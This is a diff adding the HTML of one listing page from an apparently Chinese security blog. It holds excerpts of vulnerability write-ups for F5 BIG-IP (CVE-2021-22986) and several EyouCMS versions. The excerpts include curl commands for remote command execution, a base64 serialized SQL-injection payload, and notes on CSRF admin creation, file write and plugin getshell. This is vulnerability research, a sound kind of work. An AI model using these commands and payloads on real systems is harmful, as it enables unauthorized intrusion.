@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/78/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-F5 BIG-IP/(CVE-2021-22986) F5 BIG-IP iControl RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/F5%20BIG-IP/(CVE-2021-22986)%20F5%20BIG-IP%20iControl%20RCE/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.191Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2021-22986-F5-BIG-IP-iControl-RCE"><a href="#CVE-2021-22986-F5-BIG-IP-iControl-RCE" class="headerlink" title="(CVE-2021-22986) F5 BIG-IP iControl RCE"></a>(CVE-2021-22986) F5 BIG-IP iControl RCE</h1><p>================</p>
+<p>PoC #1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -su admin: -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://[victimIP]/mgmt/tm/util/bash -d <span class="string">&#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/(CVE-2021-22986)F5-BIG-IP-iControl-RCE/media/1.png)</p>
+<p>PoC #2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ks https://[victimIP]/mgmt/shared/authn/login -d <span class="string">&#x27;&#123;&quot;bigipAuthCookie&quot;:&quot;&quot;,&quot;loginReference&quot;:&#123;&quot;link&quot;:&quot;http://localhost/mgmt/tm/access/bundle-install-tasks&quot;&#125;,&quot;filePath&quot;:&quot;`id`&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/(CVE-2021-22986)F5-BIG-IP-iControl-RCE/media/2.png)</p>
+<p>PoC #3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ksu admin:[redacted] https://[vimtimIP]/mgmt/tm/access/bundle-install-tasks -d <span class="string">&#x27;&#123;&quot;filePath&quot;:&quot;id&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/F5%20BIG-IP/(CVE-2021-22986)%20F5%20BIG-IP%20iControl%20RCE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/F5%20BIG-IP/(CVE-2021-22986)%20F5%20BIG-IP%20iControl%20RCE/" data-id="cl5c2qov0006sy8v1dfxr8bqn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/EyouCMS 1.5.2 后台文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/EyouCMS%201.5.2%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.977Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EyouCMS-1-5-2-后台文件包含漏洞"><a href="#EyouCMS-1-5-2-后台文件包含漏洞" class="headerlink" title="EyouCMS 1.5.2 后台文件包含漏洞"></a>EyouCMS 1.5.2 后台文件包含漏洞</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul>
+<li>前台设置一个管理员的session</li>
+<li>后台远程插件下载文件包含getshell。</li>
+</ul>
+<h3 id="前台设置管理员session"><a href="#前台设置管理员session" class="headerlink" title="前台设置管理员session"></a>前台设置管理员session</h3><p>在<code>application/api/controller/Ajax.php:219</code></p>
+<p>![](/resource/EyouCMS1.5.2后台文件包含漏洞/media/1.jpeg)</p>
+<p>get_token函数是可以前台随意调用的，另外形参中的$name变量也是通过http传递进来的。跟进token函数，如下图所示。</p>
+<p>![](/resource/EyouCMS1.5.2后台文件包含漏洞/media/2.jpeg)</p>
+<p>箭头处有一个设置session的操作，名字是可控的，而值是请求时间戳md5的值。不可控。</p>
+<p>既然可以设置任意session名字了，那么我们是否可以给自己一个管理员的session呢？</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/EyouCMS%201.5.2%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/EyouCMS%201.5.2%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qonw006hy8v1el2p22jo" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.42 后台插件getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.42%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.975Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-42-后台插件getshell"><a href="#Eyoucms-1-42-后台插件getshell" class="headerlink" title="Eyoucms 1.42 后台插件getshell"></a>Eyoucms 1.42 后台插件getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要进后台+知道后台插件密码</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>需要知道后台密码+后台插件密码</p>
+<p>//如果第一次使用插件，那么密码可以直接设置，如果管理员设置过了，则可以选择爆破</p>
+<p>插件有格式限制，可以从官网随便下个，解压后插入php文件重新打包上传</p>
+<p><img src="/resource/Eyoucms1.42%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6getshell/media/rId24.png"></p>
+<p>可以看出文件已成功解压到服务器</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.42%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.42%20%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6getshell/" data-id="cl5c2qoo5006qy8v19vgzfxdi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.4.3 后台代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.973Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-3-后台代码执行漏洞"><a href="#Eyoucms-1-4-3-后台代码执行漏洞" class="headerlink" title="Eyoucms 1.4.3 后台代码执行漏洞"></a>Eyoucms 1.4.3 后台代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Eyoucms v1.4.3 版本后台修改模板文件可代码执行</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.4.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>从官网下载最新版反复确认v1.4.3暂未修复。利用也很简单直接在高级选项 -&gt;<br>模板管理 -&gt; 修改pc模板。修改index.htm为例。</p>
+<p><img src="/resource/Eyoucms1.4.3%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p><img src="/resource/Eyoucms1.4.3%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>回到index页面刷新</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qoo4006py8v1262c7igj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.4.3 任意文件写入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.970Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-3-任意文件写入"><a href="#Eyoucms-1-4-3-任意文件写入" class="headerlink" title="Eyoucms 1.4.3 任意文件写入"></a>Eyoucms 1.4.3 任意文件写入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>可写入html,css,js,txt文件，总体来说比较鸡肋。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.4.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点只对<code>filename</code>进行过滤，而忘了<code>activepath</code>也可以<code>../</code>进行跳转<br><code>application/admin/controller/Filemanager.php</code></p>
+<pre><code>  if (IS_POST) &#123;
+         $post = input(&#39;post.&#39;, &#39;&#39;, null);
+         $content = input(&#39;post.content&#39;, &#39;&#39;, null);
+         $filename = !empty($post[&#39;filename&#39;]) ? trim($post[&#39;filename&#39;]) : &#39;&#39;;
+         $content = !empty($content) ? $content : &#39;&#39;;
+         $activepath = !empty($post[&#39;activepath&#39;]) ? trim($post[&#39;activepath&#39;]) : &#39;&#39;;
+
+             ... ...
+
+         $r = $this-&gt;filemanagerLogic-&gt;editFile($filename, $activepath, $content);
+         if ($r === true) &#123;
+             $this-&gt;success(&#39;操作成功！&#39;, url(&#39;Filemanager/index&#39;, array(&#39;activepath&#39;=&gt;$this-&gt;filemanagerLogic-&gt;replace_path($activepath, &#39;:&#39;, false))));
+             exit;
+         &#125; else &#123;
+             ... ...
+</code></pre>
+<p>跟进<code>editFile</code>函数</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" data-id="cl5c2qony006oy8v15ul24i9j" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.4.3 csrf漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.967Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-3-csrf漏洞"><a href="#Eyoucms-1-4-3-csrf漏洞" class="headerlink" title="Eyoucms 1.4.3 csrf漏洞"></a>Eyoucms 1.4.3 csrf漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>可通过csrf漏洞添加管理员</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.4.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞触发点在<code>application\admin\controller\Admin.php</code></p>
+<pre><code>  public function admin_add()
+ &#123;
+     $this-&gt;language_access(); // 多语言功能操作权限
+
+     if (IS_POST) &#123;
+         $data = input(&#39;post.&#39;);
+
+         if (0 &lt; intval(session(&#39;admin_info.role_id&#39;))) &#123;
+             $this-&gt;error(&quot;超级管理员才能操作！&quot;);
+         &#125;
+
+         if (empty($data[&#39;password&#39;]) || empty($data[&#39;password2&#39;])) &#123;
+             $this-&gt;error(&quot;密码不能为空！&quot;);
+         &#125;else if ($data[&#39;password&#39;] != $data[&#39;password2&#39;]) &#123;
+             $this-&gt;error(&quot;两次密码输入不一致！&quot;);
+         &#125;
+
+         ...
+
+         if (empty($data[&#39;pen_name&#39;])) &#123;
+             $data[&#39;pen_name&#39;] = $data[&#39;user_name&#39;];
+         &#125;
+         if (M(&#39;admin&#39;)-&gt;where(&quot;user_name&quot;, $data[&#39;user_name&#39;])-&gt;count()) &#123;
+             $this-&gt;error(&quot;此用户名已被注册，请更换&quot;,url(&#39;Admin/admin_add&#39;));
+         &#125; else &#123;
+             $admin_id = M(&#39;admin&#39;)-&gt;insertGetId($data);
+             if ($admin_id) &#123;
+                 adminLog(&#39;新增管理员：&#39;.$data[&#39;user_name&#39;]);
+
+                 /*同步追加一个后台管理员到会员用户表*/
+                 try &#123;
+                     $usersInfo = Db::name(&#39;users&#39;)-&gt;field(&#39;users_id&#39;)-&gt;where([
+                             &#39;username&#39;  =&gt; $data[&#39;user_name&#39;],
+                             &#39;lang&#39;      =&gt; $this-&gt;admin_lang,
+                         ])-&gt;find();
+                     if (!empty($usersInfo)) &#123;
+                         $r = Db::name(&#39;users&#39;)-&gt;where([&#39;users_id&#39;=&gt;$usersInfo[&#39;users_id&#39;]])-&gt;update([
+                                 &#39;nickname&#39;      =&gt; $data[&#39;user_name&#39;],
+                                 &#39;admin_id&#39;      =&gt; $admin_id,
+                                 &#39;is_activation&#39; =&gt; 1,
+                                 &#39;is_lock&#39;       =&gt; 0,
+                                 &#39;is_del&#39;        =&gt; 0,
+                                 &#39;update_time&#39;   =&gt; getTime(),
+                             ]);
+                         !empty($r) &amp;&amp; $users_id = $usersInfo[&#39;users_id&#39;];
+                     &#125; else &#123;
+                         // 获取要添加的用户名
+                         ...
+
+                         $users_id = Db::name(&#39;users&#39;)-&gt;insertGetId($AddData);
+                     &#125;
+                     if (!empty($users_id)) &#123;
+                         Db::name(&#39;admin&#39;)-&gt;where([&#39;admin_id&#39;=&gt;$admin_id])-&gt;update([
+                                 &#39;syn_users_id&#39;  =&gt; $users_id,
+                                 &#39;update_time&#39;   =&gt; getTime(),
+                             ]);
+                     &#125;
+                 &#125; catch (\Exception $e) &#123;&#125;
+                 /* END */
+
+                 $this-&gt;success(&quot;操作成功&quot;, url(&#39;Admin/index&#39;));
+             &#125; else &#123;
+                 $this-&gt;error(&quot;操作失败&quot;);
+             &#125;
+         &#125;
+     &#125;
+</code></pre>
+<p>可以看到进队管理员权限进行校验，而没有对提交token进行校验，导致恶意用户可引导管理员点击构造的url进行管理员添加，实际操作可不跳转到管理页面，以免引起怀疑。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qony006ny8v1byh873n4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.4.2 后台注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.964Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-2-后台注入"><a href="#Eyoucms-1-4-2-后台注入" class="headerlink" title="Eyoucms 1.4.2 后台注入"></a>Eyoucms 1.4.2 后台注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>/application/admin/controller/Index.php</p>
+<pre><code>public function changeTableVal()
+&#123;
+    if (IS_AJAX_POST) &#123;
+        $url = null;
+        $data = [
+            &#39;refresh&#39;   =&gt; 0,
+        ];
+        $table = input(&#39;post.table/s&#39;); // 表名
+        $id_name = input(&#39;post.id_name/s&#39;); // 表主键id名
+        $id_value = input(&#39;post.id_value/s&#39;); // 表主键id值
+        $field  = input(&#39;post.field/s&#39;); // 修改哪个字段
+        $value  = input(&#39;post.value/s&#39;, &#39;&#39;, null); // 修改字段值  
+        switch ($table) &#123;
+            // 会员等级表
+            case &#39;users_level&#39;:
+                &#123;
+                    $return = model(&#39;UsersLevel&#39;)-&gt;isRequired($id_name,$id_value,$field,$value);
+                    if (is_array($return)) &#123;
+                        $this-&gt;error($return[&#39;msg&#39;]);
+                    &#125;
+                &#125;
+                break;
+            
+            // 会员属性表
+            case &#39;users_parameter&#39;:
+                &#123;
+                    $return = model(&#39;UsersParameter&#39;)-&gt;isRequired($id_name,$id_value,$field,$value);
+                    if (is_array($return)) &#123;
+                        $this-&gt;error($return[&#39;msg&#39;]);
+                    &#125;
+                &#125;
+                break;
+            
+            // 会员中心菜单表
+            case &#39;users_menu&#39;:
+                &#123;
+                    Db::name(&#39;users_menu&#39;)-&gt;where(&#39;id&#39;,&#39;gt&#39;,0)-&gt;update([
+                            &#39;is_userpage&#39;   =&gt; 0,
+                            &#39;update_time&#39;   =&gt; getTime(),
+                        ]);
+                    $data[&#39;refresh&#39;] = 1;
+                &#125;
+                break;
+            
+            // 会员投稿功能
+            case &#39;archives&#39;:
+                &#123;
+                    if (&#39;arcrank&#39; == $field) &#123;
+                        if (0 == $value) &#123;
+                            $value = -1;
+                        &#125;else&#123;
+                            $value = 0;
+                        &#125;
+                    &#125;
+                &#125;
+                break;
+            // 会员产品类型表
+            case &#39;users_type_manage&#39;:
+                &#123;
+                    if (empty($value)) &#123;
+                        $this-&gt;error(&#39;不可为空&#39;);
+                    &#125;
+                &#125;
+                break;
+            default:
+                # code...
+                break;
+        &#125;
+        $savedata = [
+            $field =&gt; $value,
+            &#39;update_time&#39;   =&gt; getTime(),
+        ];
+        M($table)-&gt;where(&quot;$id_name = $id_value&quot;)-&gt;cache(true,null,$table)-&gt;save($savedata); // 根据条件保存修改的数据
+        // 以下代码可以考虑去掉，与行为里的清除缓存重复 AppEndBehavior.php / clearHtmlCache
+        switch ($table) &#123;
+            case &#39;auth_modular&#39;:
+                extra_cache(&#39;admin_auth_modular_list_logic&#39;, null);
+                extra_cache(&#39;admin_all_menu&#39;, null);
+                break;
+            
+            default:
+                // 清除logic逻辑定义的缓存
+                extra_cache(&#39;admin_&#39;.$table.&#39;_list_logic&#39;, null);
+                // 清除一下缓存
+                // delFile(RUNTIME_PATH.&#39;html&#39;); // 先清除缓存, 否则不好预览
+                \think\Cache::clear($table);
+                break;
+        &#125;
+        /*清除页面缓存*/
+        // $htmlCacheLogic = new \app\common\logic\HtmlCacheLogic;
+        // $htmlCacheLogic-&gt;clear_archives();
+        /*--end*/
+        
+        $this-&gt;success(&#39;更新成功&#39;, $url, $data);
+    &#125;
+&#125;
+</code></pre>
+<p>第307行：</p>
+<pre><code>M($table)-&gt;where(&quot;$id_name = $id_value&quot;)-&gt;cache(true,null,$table)-&gt;save($savedata); // 根据条件保存修改的数据
+</code></pre>
+<p>直接将函数头获取的POST传入SQL语句里面：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/" data-id="cl5c2qony006my8v1ekid00q1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.4.2 sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.2%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.961Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-2-sql注入"><a href="#Eyoucms-1-4-2-sql注入" class="headerlink" title="Eyoucms 1.4.2 sql注入"></a>Eyoucms 1.4.2 sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>介绍漏洞之前先了解下这套CMS，EyouCms是基于TP5.0（5.0.24）框架为核心开发的免费+开源的企业内容管理系统。</p>
+<p>Payload:</p>
+<pre><code>http://0-sec.org/index.php?m=user&amp;c=pay&amp;a=pay_recharge_detail&amp;querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czoyNzoidXNlcnNfaWQgPSA1KSBhbmQgc2xlZXAoNSkjIjt9fQ==
+</code></pre>
+<p>漏洞文件：/EyouCMS-V1.4.2-UTF8-SP2/application/user/controller/Pay.php</p>
+<p>漏洞函数：pay_recharge_detail</p>
+<pre><code>public function pay_recharge_detail()
+&#123;
+    $querystr   = input(&#39;param.querystr/s&#39;);
+    $querydata  = unserialize(base64_decode($querystr));
+
+    if (!empty($querydata[&#39;moneyid&#39;]) &amp;&amp; !empty($querydata[&#39;order_number&#39;])) &#123;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.2%20sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.2%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qonx006ky8v1cdl9cm7f" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.4.1 前台rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.1%20%E5%89%8D%E5%8F%B0rce/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.958Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
